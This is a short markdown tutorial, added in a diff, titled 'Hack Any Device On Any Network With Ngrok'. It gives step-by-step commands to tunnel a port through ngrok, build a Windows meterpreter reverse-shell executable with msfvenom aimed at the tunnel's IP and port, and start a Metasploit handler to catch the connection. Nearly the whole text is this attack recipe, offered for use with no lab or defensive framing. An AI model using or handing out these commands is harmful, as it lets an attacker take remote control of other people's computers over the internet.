@@ -1,0 +1,66 @@
+
+## Hack Any Device On Any Network With Ngrok
+
+
+		There are two different ways of doing this
+		
+			-> Port Forwarding
+			
+			-> Using Ngrok
+			
+			
+			
+			
+### Install Ngrok
+	
+	https://ngrok.com/
+	
+	Sign up and download for linux
+	
+	-> cd Downloads
+	
+	-> mv ngrok-stable-linux-amd64.tgz /home/kali/Desktop
+	
+	-> tar -xvf ngrok-stable-linux-amd64.tgz
+	
+	-> ./ngrok authtoken <auth token>
+	
+	-> ./ngrok help
+	
+	-> ./ngrok tcp 5555
+	
+
+
+### Find the IP address
+	
+	-> host 0.tcp.ngrok.io
+	
+	This IP address will be used as a locahost in payload creation
+
+
+
+### Create the payload
+	
+	-> cd Dekstop
+	
+	-> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=3.14.182.203 LPORT=15859 -f exe -o shell.exe
+	
+	
+
+
+
+### Setting Up the Listener
+	
+	-> msfconsole
+	
+	-> use exploit/multi/handler
+	
+	-> set payload windows/x64/meterpreter/reverse_tcp
+	
+	-> set LHOST 0.0.0.0   //means we are listening to any incoming connection
+	
+	-> set LPORT 5555
+	
+	-> run 
+	
+	
